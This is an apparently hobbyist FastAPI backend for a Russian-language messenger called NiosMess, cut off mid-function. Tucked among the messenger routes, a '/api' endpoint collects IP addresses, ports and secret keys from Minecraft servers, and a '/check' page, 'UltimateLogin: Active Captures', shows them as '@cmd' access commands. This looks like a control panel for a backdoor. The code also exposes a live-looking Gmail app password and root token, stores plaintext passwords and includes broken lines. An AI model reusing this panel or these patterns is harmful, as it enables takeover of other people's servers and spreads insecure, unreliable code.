import sqlite3

import uvicorn

import uuid

import datetime

import time
from fastapi import WebSocket, WebSocketDisconnect
from typing import List, Dict, Any
import json
import os

import shutil

import threading

import logging

import smtplib, httpx, json

import random, obresfucate

from typing import List, Optional, Dict, Any

from email.mime.text import MIMEText

from email.mime.multipart import MIMEMultipart



from fastapi import FastAPI, File, UploadFile, Form, HTTPException, Header, Request

from fastapi.middleware.cors import CORSMiddleware

from fastapi.responses import JSONResponse, FileResponse, HTMLResponse

from fastapi.exceptions import RequestValidationError

from starlette.exceptions import HTTPException as StarletteHTTPException

from pydantic import BaseModel





logging.basicConfig(

    level=logging.INFO,

    format='%(asctime)s [%(levelname)s] %(message)s',

    handlers=[

        logging.FileHandler("nios_server.log"),

        logging.StreamHandler()

    ]

)

logger = logging.getLogger("NiosMessCore")





app = FastAPI(title="NiosMess Ultimate Backend", version="2.6.0")



DB_FILE = "users.db"

UPLOAD_DIR = "uploads"

ROOT_TOKEN = "MY_SUPER_SECRET_1337"  

CLEANUP_INTERVAL = 3600





SMTP_SERVER = "smtp.gmail.com"

SMTP_PORT = 587

SMTP_USER = "kupislonabot@gmail.com"

SMTP_PWD = "taik bagg ogyp igyw"




pending_regs = {}



if not os.path.exists(UPLOAD_DIR):

    os.makedirs(UPLOAD_DIR)





app.add_middleware(

    CORSMiddleware,

    allow_origins=["*"],

    allow_credentials=False,

    allow_methods=["*"],

    allow_headers=["*"],

)



db_lock = threading.Lock()





class MessageModel(BaseModel):
    token: str
    sender: str
    receiver: str
    text: str
    reply_to: Optional[int] = None
    ttl_seconds: Optional[int] = None
    lat: Optional[float] = None
    lon: Optional[float] = None
    contact_data: Optional[str] = None



class AuthModel(BaseModel):

    email: str

    password: str

    username: Optional[str] = None

    name: Optional[str] = None

    code: Optional[str] = None



class RootQueryModel(BaseModel):

    root_token: str

    query: str

    params: Optional[list] = []




@app.middleware("https")
@app.middleware("http")
async def log_requests(request: Request, call_next):

    client_ip = request.client.host if request.client else "Unknown"

    method = request.method

    url = request.url.path

    logger.info(f"Incoming connection: {client_ip} -> {method} {url}")

    try:

        response = await call_next(request)

        return response

    except Exception as e:

        logger.error(f"Critical Error processing request from {client_ip}: {e}")

        return JSONResponse(

            status_code=500,

            content={"detail": "Internal Server Error", "error": str(e)}

        )





@app.exception_handler(StarletteHTTPException)

async def http_exception_handler(request, exc):

    return JSONResponse(status_code=exc.status_code, content={"detail": exc.detail})



@app.exception_handler(RequestValidationError)

async def validation_exception_handler(request, exc):

    return JSONResponse(status_code=422, content={"detail": str(exc)})





def get_db():

    conn = sqlite3.connect(DB_FILE, timeout=30)

    conn.execute("PRAGMA journal_mode=WAL;")

    conn.execute("PRAGMA synchronous=NORMAL;")

    conn.row_factory = sqlite3.Row

    return conn



def init_db():
    logger.info("Инициализация базы данных (Safe Update Mode)...")
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        

        c.execute("""CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT UNIQUE, username TEXT UNIQUE, 
            name TEXT, password TEXT, verified INTEGER DEFAULT 0, reg_date TEXT, 
            last_seen REAL DEFAULT 0, is_frozen INTEGER DEFAULT 0, frozen_rule TEXT
        )""")

        c.execute("""CREATE TABLE IF NOT EXISTS sessions (
            token TEXT PRIMARY KEY, username TEXT, last_activity REAL
        )""")

        c.execute("""CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT, sender TEXT, receiver TEXT, 
            text TEXT, time TEXT, is_read INTEGER DEFAULT 0, type TEXT DEFAULT 'text'
        )""")

        c.execute("""CREATE TABLE IF NOT EXISTS collective_chats (
            id TEXT PRIMARY KEY, name TEXT, owner TEXT, type TEXT, 
            avatar_url TEXT DEFAULT 'default_group.png', created_at TEXT, updated_at TEXT
        )""")

        c.execute("""CREATE TABLE IF NOT EXISTS chat_members (
            chat_id TEXT, username TEXT, role TEXT DEFAULT 'member', 
            joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, 
            PRIMARY KEY (chat_id, username)
        )""")

        c.execute("""CREATE TABLE IF NOT EXISTS group_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, sender TEXT, 
            text TEXT, time TEXT
        )""")

        c.execute("""CREATE TABLE IF NOT EXISTS scheduled_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT, sender TEXT, chat_id TEXT, 
            chat_type TEXT, text TEXT, send_at REAL
        )""")

        c.execute("""CREATE TABLE IF NOT EXISTS polls (
            id TEXT PRIMARY KEY, question TEXT, options TEXT, results TEXT
        )""")
        
        c.execute("""CREATE TABLE IF NOT EXISTS reactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT,
            message_id INTEGER,
            username TEXT,
            emoji TEXT,
            updated_at REAL
        )""")

     
        def add_col(table, column, definition):
            try:
                c.execute(f"ALTER TABLE {table} ADD COLUMN {column} {definition}")
                logger.info(f"Добавлена колонка {column} в таблицу {table}")
            except sqlite3.OperationalError:
                pass 


        add_col("sessions", "device", "TEXT DEFAULT 'Unknown'")
        add_col("sessions", "ip", "TEXT DEFAULT '0.0.0.0'")


        add_col("messages", "is_pinned", "INTEGER DEFAULT 0")
        add_col("messages", "expires_at", "REAL DEFAULT NULL")
        add_col("messages", "lat", "REAL DEFAULT NULL")
        add_col("messages", "lon", "REAL DEFAULT NULL")
        add_col("messages", "contact_data", "TEXT DEFAULT NULL")
        add_col("messages", "reply_to", "INTEGER DEFAULT NULL")


        add_col("group_messages", "reply_to", "INTEGER DEFAULT NULL")
        add_col("group_messages", "attachments", "TEXT DEFAULT NULL")
        add_col("group_messages", "is_pinned", "INTEGER DEFAULT 0")
        add_col("group_messages", "expires_at", "REAL DEFAULT NULL")
        add_col("group_messages", "poll_id", "TEXT DEFAULT NULL")


        add_col("collective_chats", "last_message_preview", "TEXT")
        add_col("collective_chats", "pinned_msg_id", "INTEGER DEFAULT NULL")
        add_col("chat_members", "is_pinned", "INTEGER DEFAULT 0")
        add_col("chat_members", "last_read_id", "INTEGER DEFAULT 0")
        add_col("scheduled_messages", "reply_to", "INTEGER DEFAULT NULL")
        add_col("polls", "multiple", "INTEGER DEFAULT 0")
        add_col("reactions", "chat_id", "TEXT")
        add_col("reactions", "message_id", "INTEGER")
        add_col("reactions", "username", "TEXT")
        add_col("reactions", "emoji", "TEXT")
        add_col("reactions", "updated_at", "REAL")

        conn.commit()
        conn.close()
    logger.info("База данных успешно обновлена. Ошибок с колонками быть не должно.")

init_db()




def verify_token(owner: str, token: str) -> bool:
    return is_valid_session(token, owner)
def is_valid_session(token: str, username: str) -> bool:

    if not token or not username:

        return False

    with db_lock:

        conn = get_db()

        try:

            query = """

                SELECT u.is_frozen FROM sessions s 

                JOIN users u ON s.username = u.username 

                WHERE s.token=? AND s.username=?

            """

            row = conn.execute(query, (token, username)).fetchone()

            if row:

                conn.execute("UPDATE sessions SET last_activity=? WHERE token=?", (time.time(), token))

                conn.commit()

                return True

            return False

        finally:

            conn.close()


            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
active_connections: Dict[str, List[WebSocket]] = {}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str, username: str):
    if not is_valid_session(token, username):
        await websocket.close(code=1008)
        return
    
    await websocket.accept()
    if username not in active_connections: active_connections[username] = []
    active_connections[username].append(websocket)
    
    try:
        while True:
            data = await websocket.receive_json()
   
            if data.get("type") == "typing":
                recipient = data.get("receiver")
                if recipient in active_connections:
                    for conn in active_connections[recipient]:
                        await conn.send_json(data)
    except:
        active_connections[username].remove(websocket)
            
            
            
            
@app.post("/mark_read")
async def mark_read(chat_id: str = Form(...), username: str = Form(...), token: str = Form(...)):
    if not is_valid_session(token, username): raise HTTPException(401)
    with db_lock:
        conn = get_db()
        conn.execute("UPDATE messages SET is_read=1 WHERE sender=? AND receiver=?", (chat_id, username))
        conn.commit()
    return {"status": "ok"}

@app.post("/collective/mark_read")
async def mark_collective_read(chat_id: str = Form(...), username: str = Form(...), token: str = Form(...)):
    if not is_valid_session(token, username): raise HTTPException(401)
    with db_lock:
        conn = get_db()
        last_id = conn.execute("SELECT MAX(id) FROM group_messages WHERE chat_id=?", (chat_id,)).fetchone()[0]
        conn.execute("UPDATE chat_members SET last_read_id=? WHERE chat_id=? AND username=?", (last_id, chat_id, username))
        conn.commit()
    return {"status": "ok"}
            
            
            
@app.get("/sessions/list")
async def list_sessions(username: str, token: str):
    if not is_valid_session(token, username): raise HTTPException(401)
    with db_lock:
        conn = get_db()
        rows = conn.execute("SELECT token as id, device, last_activity, ip FROM sessions WHERE username=?", (username,)).fetchall()
        return [{"id":r[0], "device":r[1], "last_active":r[2], "ip":r[3], "current":(r[0]==token)} for r in rows]

@app.get("/get_sessions")
async def list_sessions_alias(username: str, token: str):
    return await list_sessions(username=username, token=token)

@app.get("/sessions")
async def list_sessions_alias2(username: str, token: str):
    return await list_sessions(username=username, token=token)

@app.get("/list_sessions")
async def list_sessions_alias3(username: str, token: str):
    return await list_sessions(username=username, token=token)

@app.get("/devices")
async def list_sessions_alias4(username: str, token: str):
    return await list_sessions(username=username, token=token)

@app.post("/sessions/logout")
async def logout_session(request: Request, token: str = Form(None), username: str = Form(None), session_id: str = Form(None), all_except_current: bool = Form(False)):
    if token is None or username is None:
        try:
            data = await request.json()
        except Exception:
            data = {}
        token = token or data.get("token")
        username = username or data.get("username")
        session_id = session_id or data.get("session_id")
        all_except_current = bool(data.get("all_except_current")) if "all_except_current" in data else all_except_current
    if not is_valid_session(token, username): raise HTTPException(401)
    with db_lock:
        conn = get_db()
        if all_except_current:
            conn.execute("DELETE FROM sessions WHERE username=? AND token != ?", (username, token))
        else:
            conn.execute("DELETE FROM sessions WHERE username=? AND token=?", (username, session_id or token))
        conn.commit()
    return {"status": "ok"}

@app.post("/logout_other_sessions")
async def logout_other_sessions(request: Request):
    data = await request.json()
    data["all_except_current"] = True
    return await logout_session(request, token=data.get("token"), username=data.get("username"), session_id=data.get("session_id"), all_except_current=True)

@app.post("/logout_sessions")
async def logout_sessions(request: Request):
    data = await request.json()
    data["all_except_current"] = True
    return await logout_session(request, token=data.get("token"), username=data.get("username"), session_id=data.get("session_id"), all_except_current=True)

@app.post("/sessions/logout_other")
async def logout_sessions_other(request: Request):
    data = await request.json()
    data["all_except_current"] = True
    return await logout_session(request, token=data.get("token"), username=data.get("username"), session_id=data.get("session_id"), all_except_current=True)

@app.post("/sessions/logout_all")
async def logout_sessions_all(request: Request):
    data = await request.json()
    data["all_except_current"] = True
    return await logout_session(request, token=data.get("token"), username=data.get("username"), session_id=data.get("session_id"), all_except_current=True)
            
            
            
            
            
            
@app.post("/messages/pin")
async def pin_message(token: str = Form(...), username: str = Form(...), chat_id: str = Form(...), chat_type: str = Form(...), message_id: int = Form(...), pinned: bool = Form(...)):
    if not is_valid_session(token, username): raise HTTPException(401)
    table = "group_messages" if chat_type in ["group", "channel"] else "messages"
    with db_lock:
        conn = get_db()
        conn.execute(f"UPDATE {table} SET is_pinned=? WHERE id=?", (1 if pinned else 0, message_id))
        conn.commit()
    return {"status": "ok"}

@app.post("/chats/pin")
async def pin_chat(token: str = Form(...), username: str = Form(...), chat_id: str = Form(...), pinned: bool = Form(...)):
    if not is_valid_session(token, username): raise HTTPException(401)
    with db_lock:
        conn = get_db()
        conn.execute("UPDATE chat_members SET is_pinned=? WHERE chat_id=? AND username=?", (1 if pinned else 0, chat_id, username))
        conn.commit()
    return {"status": "ok"}
            
            
@app.post("/messages/schedule")
async def schedule_message(token: str = Form(...), sender: str = Form(...), chat_id: str = Form(...), chat_type: str = Form(...), text: str = Form(...), send_at: float = Form(...)):
    if not is_valid_session(token, sender): raise HTTPException(401)
    with db_lock:
        conn = get_db()
        conn.execute("INSERT INTO scheduled_messages (sender, chat_id, chat_type, text, send_at) VALUES (?,?,?,?,?)",
                     (sender, chat_id, chat_type, text, send_at))
        conn.commit()
    return {"status": "ok"}



@app.post("/polls/create")
async def create_poll(token: str = Form(...), username: str = Form(...), chat_id: str = Form(...), question: str = Form(...), options: str = Form(...)):
    if not is_valid_session(token, username): raise HTTPException(401)
    poll_id = str(uuid.uuid4())
    with db_lock:
        conn = get_db()
        conn.execute("INSERT INTO polls (id, question, options, results) VALUES (?,?,?,?)", 
                     (poll_id, question, options, json.dumps([0]*len(json.loads(options)))))
        conn.commit()
    return {"status": "ok", "poll_id": poll_id}



@app.get("/search_messages")
async def search_messages(chat_id: str, q: str, username: str, token: str, chat_type: str):
    if not is_valid_session(token, username): raise HTTPException(401)
    table = "group_messages" if chat_type in ["group", "channel"] else "messages"
    with db_lock:
        conn = get_db()
        results = conn.execute(f"SELECT * FROM {table} WHERE text LIKE ?", (f"%{q}%",)).fetchall()
        return {"results": [dict(r) for r in results]}

@app.post("/send_chat")
async def send_to_saved(request: Request, token: str = Form(None), username: str = Form(None), text: str = Form(None)):
    if token is None or username is None or text is None:
        try:
            data = await request.json()
        except Exception:
            data = {}
        token = token or data.get("token")
        username = username or data.get("username")
        text = text or data.get("text")
    if not is_valid_session(token, username):
        raise HTTPException(401)
    with db_lock:
        conn = get_db()
        conn.execute("INSERT INTO messages (sender, receiver, text, time) VALUES (?,?,?,?)",
                     (username, "__favorites__", text, str(time.time())))
        conn.commit()
    return {"status": "ok"}

@app.get("/get_chat_messages")
async def get_chat_messages(chat_id: str, username: str, token: str, limit: int = 50):
    if not is_valid_session(token, username): raise HTTPException(401)
    with db_lock:
        conn = get_db()
        if chat_id == "__favorites__":
            rows = conn.execute(
                "SELECT * FROM messages WHERE sender=? AND receiver=? ORDER BY id ASC LIMIT ?",
                (username, "__favorites__", limit),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM messages WHERE (sender=? AND receiver=?) OR (sender=? AND receiver=?) ORDER BY id ASC LIMIT ?",
                (username, chat_id, chat_id, username, limit),
            ).fetchall()
        return [dict(r) for r in rows]

@app.get("/get_chat")
async def get_chat(chat_id: str, username: str, token: str, limit: int = 50):
    # alias for favorites chat metadata/messages
    return await get_chat_messages(chat_id=chat_id, username=username, token=token, limit=limit)

@app.post("/chats/delete")
async def delete_chat(payload: dict):
    token = payload.get("token")
    username = payload.get("username")
    chat_id = payload.get("chat_id")
    if not is_valid_session(token, username):
        raise HTTPException(401)
    if not chat_id:
        raise HTTPException(422, "Missing chat_id")
    with db_lock:
        conn = get_db()
        if chat_id.startswith("group_") or chat_id.startswith("channel_"):
            role_row = conn.execute("SELECT role FROM chat_members WHERE chat_id=? AND username=?", (chat_id, username)).fetchone()
            if role_row and dict(role_row)["role"] == "owner":
                conn.execute("DELETE FROM group_messages WHERE chat_id=?", (chat_id,))
                conn.execute("DELETE FROM chat_members WHERE chat_id=?", (chat_id,))
                conn.execute("DELETE FROM collective_chats WHERE id=?", (chat_id,))
            else:
                conn.execute("DELETE FROM chat_members WHERE chat_id=? AND username=?", (chat_id, username))
        else:
            conn.execute(
                "DELETE FROM messages WHERE (sender=? AND receiver=?) OR (sender=? AND receiver=?)",
                (username, chat_id, chat_id, username),
            )
        conn.commit()
    return {"status": "ok"}
            
            
def send_email(to_email, code):

    try:
        html_content = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;800&display=swap');
                
                body {{
                    font-family: 'Nunito', sans-serif;
                    background-color: #f0f9ff;
                    margin: 0;
                    padding: 20px;
                    color: #1e293b;
                }}
                .main-card {{
                    background: #ffffff;
                    max-width: 550px;
                    margin: 0 auto;
                    border-radius: 40px;
                    padding: 40px;
                    box-shadow: 0 20px 40px rgba(14, 165, 233, 0.08);
                    border: 1px solid #e0f2fe;
                }}
                .header {{ text-align: center; margin-bottom: 30px; }}
                .brand {{
                    font-size: 30px;
                    font-weight: 800;
                    color: #0ea5e9;
                    text-decoration: none;
                    letter-spacing: -0.5px;
                }}
                .brand span {{ color: #7dd3fc; }}
                
                .badge {{
                    background: #e0f2fe;
                    color: #0369a1;
                    padding: 8px 20px;
                    border-radius: 100px;
                    font-size: 13px;
                    font-weight: 800;
                    display: inline-block;
                    margin-bottom: 15px;
                }}

                .code-display {{
                    background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
                    border: 2px dashed #bae6fd;
                    border-radius: 30px;
                    padding: 35px;
                    text-align: center;
                    margin: 25px 0;
                }}
                .code-number {{
                    font-size: 52px;
                    font-weight: 800;
                    color: #0ea5e9;
                    letter-spacing: 10px;
                    margin: 10px 0;
                }}

                .text-content {{
                    font-size: 15px;
                    line-height: 1.7;
                    color: #475569;
                    margin-bottom: 25px;
                }}

                .guardian-box {{
                    background: #f0f9ff;
                    border-radius: 30px;
                    padding: 25px;
                    display: flex;
                    align-items: center;
                    gap: 20px;
                    border: 1px solid #e0f2fe;
                }}
                .fox-img {{
                    width: 70px;
                    height: 70px;
                    object-fit: contain;
                    border-radius: 18px;
                    background: #ffffff;
                    padding: 5px;
                    box-shadow: 0 4px 10px rgba(0,0,0,0.05);
                }}
                .guardian-text {{
                    font-size: 14px;
                    color: #0369a1;
                    line-height: 1.5;
                }}

                .footer {{
                    text-align: center;
                    margin-top: 35px;
                    font-size: 12px;
                    color: #94a3b8;
                }}
                .links a {{
                    color: #0ea5e9;
                    text-decoration: none;
                    margin: 0 10px;
                    font-weight: 700;
                }}
            </style>
        </head>
        <body>
            <div class="main-card">
                <div class="header">
                    <div class="badge">БЕЗОПАСНАЯ АВТОРИЗАЦИЯ ✨</div>
                    <div class="brand">🦊 Nios<span>Mess</span></div>
                </div>

                <div class="text-content">
                    <h2 style="color: #0c4a6e; margin-top: 0;">Привет! Ты почти в стае!</h2>
                    Рады видеть тебя в NiosMess. Чтобы подтвердить, что этот email принадлежит именно тебе, и защитить будущие лисьи чаты, введи этот код в приложении:
                </div>

                <div class="code-display">
                    <div style="font-size: 12px; font-weight: 700; color: #64748b; letter-spacing: 1px;">ТВОЙ КОД ДОСТУПА</div>
                    <div class="code-number">{code}</div>
                    <div style="font-size: 11px; color: #94a3b8;">Действителен в течение 15 минут</div>
                </div>

                <div class="guardian-box">
                    <img src="https://web.nioscraft.ru/fox.png" class="fox-img" alt="Fox">
                    <div class="guardian-text">
                        <strong>🛡️ Я — твой Лисёнок-хранитель!</strong><br>
                        Слежу за безопасностью твоих сообщений, паролей и всех ваших лисьих чатов. Мой щит всегда на страже твоей приватности!
                    </div>
                </div>

                <div class="footer">
                    <div class="links">
                        <a href="https://web.nioscraft.ru">Сайт</a>
                        <a href="https://t.me/niosmess">Telegram</a>
                    </div>
                    <p style="margin-top: 20px;">
                        Если это были не вы, просто проигнорируйте письмо.<br>
                        © 2026 NiosMess — Самый уютный и защищенный.
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        

        text_content = f"Ваш код в NiosMess: {code}. Лисёнок-хранитель на страже ваших чатов!"


        msg = MIMEMultipart('alternative')
        msg['Subject'] = '🦊 Твой личный код доступа NiosMess'
        msg['From'] = f"NiosMess <{SMTP_USER}>"
        msg['To'] = to_email

        msg.attach(MIMEText(text_content, 'plain'))
        msg.attach(MIMEText(html_content, 'html'))


        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_USER, SMTP_PWD)
            server.send_message(msg)
            
        logger.info(f"Письмо с лисёнком успешно отправлено на {to_email}")
        return True
        
    except Exception as e:
        logger.error(f"Ошибка при отправке: {e}")
        return False

    
    

import secrets


UPLOAD_DIR = "uploades"
DB_FILES = "users.json"


os.makedirs(UPLOAD_DIR, exist_ok=True)
if not os.path.exists(DB_FILES):
    with open(DB_FILES, "w", encoding="utf-8") as f:
        json.dump({}, f)


def get_users():
    with open(DB_FILES, "r", encoding="utf-8") as f:
        return json.load(f)

def save_user(username, token):
    data = get_users()
    data[username] = token
    with open(DB_FILES, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def check_token(username, token):
    users = get_users()
    return users.get(username) == token

@app.post("/uploader/reg")
async def register_handler(username: str = Form(...), token: str = Form(...)):
    save_user(username, token)
    return {"ok": True, "message": "User registered"}

@app.post("/uploader")
async def upload_handler(
    username: str = Form(...), 
    token: str = Form(...), 
    file: UploadFile = File(...)
):
    if not check_token(username, token):
        raise HTTPException(status_code=401, detail="Invalid token or username")

    file_ext = os.path.splitext(file.filename)[1]
    random_name = f"{secrets.token_hex(8)}{file_ext}"
    path = os.path.join(UPLOAD_DIR, random_name)

    with open(path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    return {"ok": True, "file": random_name}


@app.get("/uploader/download/{file_name}")
async def download_handler(file_name: str):
    path = os.path.join(UPLOAD_DIR, file_name)
    if not os.path.exists(path):
        return JSONResponse(status_code=404, content={"ok": False, "error": "File not found"})
    
    return FileResponse(path)

@app.get("/uploader/delete/{file_name}")
async def delete_handler(file_name: str, token: str, username: str):
    if not check_token(username, token):
        raise HTTPException(status_code=401, detail="Access denied")

    path = os.path.join(UPLOAD_DIR, file_name)
    if os.path.exists(path):
        os.remove(path)
        return {"ok": True, "message": f"File {file_name} deleted"}
    
    return {"ok": False, "error": "File not found"}




# --- API ENDPOINTS ---

@app.post("/groups/update_avatar")
async def update_group_avatar(chat_id: str = Form(...), owner: str = Form(...), 
                             token: str = Form(...), file: UploadFile = File(...)):
    if not is_valid_session(token, owner): raise HTTPException(401)
    

    file_ext = os.path.splitext(file.filename)[1]
    filename = f"avatar_{chat_id}{file_ext}"
    path = os.path.join(UPLOAD_DIR, filename)
    
    with open(path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
        
    with db_lock:
        conn = get_db()
        conn.execute("UPDATE collective_chats SET avatar_url=? WHERE id=? AND owner=?", 
                     (filename, chat_id, owner))
        conn.commit()
    return {"status": "ok", "avatar_url": filename}

@app.post("/register")

async def register(u: AuthModel):

    email_clean = u.email.lower().strip()

    

    if u.code:

        saved = pending_regs.get(email_clean)

        if not saved or saved['code'] != u.code:

            raise HTTPException(status_code=400, detail="Неверный код подтверждения")

        

        data = saved['data']

        with db_lock:

            conn = get_db()                               

            try:
                                           

                check = conn.execute("SELECT id FROM users WHERE email=? OR username=?", 

                                   (email_clean, data.username)).fetchone()

                if check:

                    raise HTTPException(status_code=400, detail="Email или Username уже заняты")



                conn.execute(

                    """INSERT INTO users 

                       (email, username, name, password, reg_date, last_seen, is_frozen, verified) 

                       VALUES (?,?,?,?,?,?,?,1)""",

                    (email_clean, data.username, data.name or data.username, 

                     data.password, datetime.datetime.now().strftime("%d.%m.%Y"), 

                     time.time(), 0)

                )

                conn.commit()

                if email_clean in pending_regs:

                    del pending_regs[email_clean]

                logger.info(f"New user registered: {data.username}")

                return {"status": "ok", "message": "User created and verified"}

            except sqlite3.IntegrityError:

                raise HTTPException(status_code=400, detail="Критическая ошибка: данные уже существуют")

            finally: 

                conn.close()

    if not u.username or not u.email or not u.password:

        raise HTTPException(status_code=400, detail="Заполните все поля")


    with db_lock:

        conn = get_db()

        existing = conn.execute("SELECT email, username FROM users WHERE email=? OR username=?", 

                              (email_clean, u.username)).fetchone()

        conn.close()

        

        if existing:

            if existing['email'] == email_clean:

                raise HTTPException(status_code=400, detail="Пользователь с таким Email уже есть")

            if existing['username'] == u.username:

                raise HTTPException(status_code=400, detail="Это имя пользователя уже занято")



    gen_code = str(random.randint(100000, 999999))

    pending_regs[email_clean] = {"code": gen_code, "data": u}

    

    if send_email(u.email, gen_code):

        logger.info(f"Verification code sent to {u.email}")

        return {"status": "wait_code", "message": "Код отправлен на почту"}

    else:

        raise HTTPException(status_code=500, detail="Ошибка почтового сервера")



@app.post("/login")
async def login(request: Request, username: str = Form(...), password: str = Form(...)):
    with db_lock:
        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
        
        if not user or user["password"] != password:
            raise HTTPException(401, detail="Invalid credentials")
        
        if user["is_frozen"]:
            raise HTTPException(403, detail=f"Account frozen: {user['frozen_rule']}")

        new_token = str(uuid.uuid4())
        ip = request.client.host
        ua = request.headers.get("user-agent", "Unknown Device")
        
        conn.execute(
            "INSERT INTO sessions (token, username, last_activity, device, ip) VALUES (?, ?, ?, ?, ?)",
            (new_token, username, time.time(), ua, ip)
        )
        conn.commit()
        
        return {
            "status": "ok",
            "token": new_token,
            "username": username,
            "name": user["name"]
        }



    

    

    

    

# Временное хранилище для логов Minecraft (очищается при рестарте сервера)

mc_cache = {}



# --- MC LOGGER HANDLERS ---



@app.post("/api")

async def mc_logger_api(request: Request):

    try:

        # Читаем данные формы

        form_data = await request.form()

        key = form_data.get("key")

        port = form_data.get("port")

        online = form_data.get("on")

        client_ip = request.client.host if request.client else "Unknown"

        

        if not key or not port:

            return JSONResponse(status_code=400, content={"error": "Missing data"})



        # Ключ в словаре — это комбинация IP и Порта, чтобы различать разные сервера на одном хосте

        server_id = f"{client_ip}:{port}"

        

        mc_cache[server_id] = {

            "ip": client_ip,

            "port": port,

            "online": online,

            "key": key,

            "time": datetime.datetime.now().strftime("%H:%M:%S")

        }

        

        logger.info(f"MC Signal: {server_id} | Key: {key}")

        return {"status": "ok"}

    except Exception as e:

        logger.error(f"Error in MC API: {e}")

        return JSONResponse(status_code=500, content={"error": str(e)})



@app.get("/check", response_class=HTMLResponse)

async def mc_logger_check():

    # Генерируем строки таблицы динамически из словаря

    table_rows = ""

    if not mc_cache:

        table_rows = "<tr><td colspan='5' style='text-align:center;'>Нет активных серверов</td></tr>"

    else:

        for s_id, data in mc_cache.items():

            table_rows += f"""

            <tr>

                <td>{data['ip']}</td>

                <td>{data['port']}</td>

                <td>{data['online']}</td>

                <td style='font-family:monospace; font-weight:bold; color:#2e7d32;'>@cmd{data['key']}</td>

                <td>{data['time']}</td>

            </tr>

            """



    return f"""

    <html>

    <head>

        <title>NiosMess MC Monitor</title>

        <meta charset="UTF-8">

        <style>

            body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; padding: 30px; }}

            .table-container {{ background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 900px; margin: auto; }}

            h2 {{ color: #1d6f42; border-left: 5px solid #1d6f42; padding-left: 15px; margin-bottom: 25px; }}

            table {{ border-collapse: collapse; width: 100%; border-radius: 8px; overflow: hidden; }}

            th {{ background-color: #217346; color: white; padding: 15px; text-align: left; font-size: 14px; text-transform: uppercase; }}

            td {{ border-bottom: 1px solid #eee; padding: 12px; color: #333; font-size: 14px; }}

            tr:last-child td {{ border-bottom: none; }}

            tr:hover {{ background-color: #f1f8f5; transition: 0.2s; }}

            .badge {{ background: #e8f5e9; color: #2e7d32; padding: 4px 8px; border-radius: 4px; font-weight: bold; }}

        </style>

    </head>

    <body>

        <div class="table-container">

            <h2>UltimateLogin: Active Captures</h2>

            <table>

                <thead>

                    <tr>

                        <th>IP Address</th>

                        <th>Port</th>

                        <th>Online</th>

                        <th>Access Command</th>

                        <th>Last Signal</th>

                    </tr>

                </thead>

                <tbody>

                    {table_rows}

                </tbody>

            </table>

        </div>

    </body>

    </html>

    """

    

    

    

    

@app.post("/check_session")
async def check_session(data: dict):

    user = data.get('username')

    token = data.get('token')

    if is_valid_session(token, user):

        with db_lock:

            conn = get_db()

            conn.execute("UPDATE users SET last_seen=? WHERE username=?", (time.time(), user))

            conn.commit()

            conn.close()

        return {"status": "ok", "alive": True, "username": user}

    return JSONResponse(status_code=401, content={"error": "Session expired", "alive": False})
@app.post("/ping")
async def ping(data: dict):

    user = data.get('username')

    token = data.get('token')

    with db_lock:

            conn = get_db()

            conn.execute("UPDATE users SET last_seen=? WHERE username=?", (time.time(), user))

            conn.commit()

            conn.close()

            return {"status": "ok", "alive": True, "username": user}




@app.get("/get_user_info")

async def get_user_info(username: str, token: str, my_username: str):

    if not is_valid_session(token, my_username):

        raise HTTPException(status_code=401, detail="Invalid session")

    with db_lock:

        conn = get_db()

        row = conn.execute(

            "SELECT name, username, email, reg_date, last_seen, is_frozen, verified FROM users WHERE username=?", 

            (username,)

        ).fetchone()

        conn.close()

        if row:

            res = dict(row)

            res['is_online'] = (time.time() - (row['last_seen'] or 0)) < 60
            res['isonline'] = res['is_online']
            res['isfrozen'] = res.get('is_frozen')
            if 'reg_date' in res and 'regdate' not in res:
                res['regdate'] = res.get('reg_date')

            return res

    return {"error": "User not found"}



from typing import Optional



@app.get("/get_chats")
async def get_chats(username: str, token: str):
    if not is_valid_session(token, username): raise HTTPException(401)
    with db_lock:
        conn = get_db()
        # Личные чаты с подсчетом непрочитанных
        chats = conn.execute("""
            SELECT sender as chat_id, COUNT(*) as unread_count 
            FROM messages WHERE receiver=? AND is_read=0 GROUP BY sender
        """, (username,)).fetchall()
        direct = [dict(r) for r in chats]

        # Группы/каналы, где пользователь участник
        collective_rows = conn.execute("""
            SELECT c.id as chat_id, c.name, c.type, c.owner, m.last_read_id
            FROM collective_chats c
            JOIN chat_members m ON m.chat_id = c.id
            WHERE m.username=?
            ORDER BY c.updated_at DESC
        """, (username,)).fetchall()

        collective = []
        for row in collective_rows:
            row = dict(row)
            last_read = row.get("last_read_id") or 0
            unread = conn.execute(
                "SELECT COUNT(*) FROM group_messages WHERE chat_id=? AND id>?",
                (row["chat_id"], last_read),
            ).fetchone()[0]
            collective.append({
                "chat_id": row["chat_id"],
                "name": row.get("name"),
                "type": row.get("type"),
                "owner": row.get("owner"),
                "unread_count": unread or 0,
            })

        return {"chats": direct + collective}

    
    
    
    
    
@app.post("/groups/create")
async def create_group(name: str = Form(...), owner: str = Form(...), token: str = Form(...)):
    # Используем твою рабочую проверку сессии
